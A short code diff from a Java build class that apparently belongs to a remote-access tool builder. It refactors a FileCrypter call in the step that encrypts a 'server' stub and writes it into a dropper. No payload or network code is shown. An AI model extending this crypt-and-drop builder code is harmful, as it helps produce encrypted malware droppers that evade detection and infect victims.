@@ -213,8 +213,7 @@ public class Build {
 				listener.reportProgress(50, "Writing server into dropper", BuildStatus.INFO);
 				String installerKey = key; 
 				
-				FileCrypter crypter = new FileCrypter();
-				crypter.encrypt(tempStubCleanJar, tempCryptedNotRunnableJar, installerKey);
+				FileCrypter.encrypt(tempStubCleanJar, tempCryptedNotRunnableJar, installerKey);
 
 				inputStub = new ZipFile(Files.getInstaller());
 				outputStub = new ZipOutputStream(new FileOutputStream(file));
